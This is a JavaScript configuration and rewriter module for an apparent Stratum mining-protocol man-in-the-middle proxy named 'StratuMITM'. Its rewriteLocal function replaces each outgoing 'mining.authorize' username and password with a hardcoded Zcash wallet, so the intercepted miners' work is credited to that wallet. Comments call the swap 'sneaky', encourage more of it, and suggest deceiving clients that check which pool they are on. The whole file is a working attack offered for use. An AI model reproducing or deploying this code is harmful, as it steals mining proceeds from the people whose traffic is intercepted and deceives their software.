// Here's some config
var config = {
  'username': 't1XGaKKKPnb7UmNJTzH37yN4DoU49SKePk9.pleaseDonate', // This is the developer's zec donation wallet, please replace with your own!
  'password': 'x' // Some pools use 'y' :)
}

// Specify what the current rewriter's method of rewriting is (sync, async). Changes API
exports.rewriteMode = 'sync';

// Rewrite a message being sent
exports.rewriteLocal = function (message) {
  switch (message.method) {
    case 'mining.authorize':
      // Here we are going to be sneaky and replace this with our own user and password
      message.params = [config.username, config.password];
      break;
    case 'mining.subscribe':
      // Let's not be sneaky and replace with ourselves as the client
      // Of course, you can be sneaky why not
      message.params = ['StratuMITM/0.1.0', "Not Actually A Nonce"];
      break;
  }
  // Other kinds of messages we can leave verbatim
  return message;
}

// Rewrite a message being recieved
exports.rewriteRemote = function (message) {
  // Don't do this, since we just want to pass the pools' messages through verbatim
  // This can be useful if you client somehow vaildates pool messages and so you 
  // can trick the client into thinking it's on the 'right pool'. You'll need to do your own work here.
  return message;
}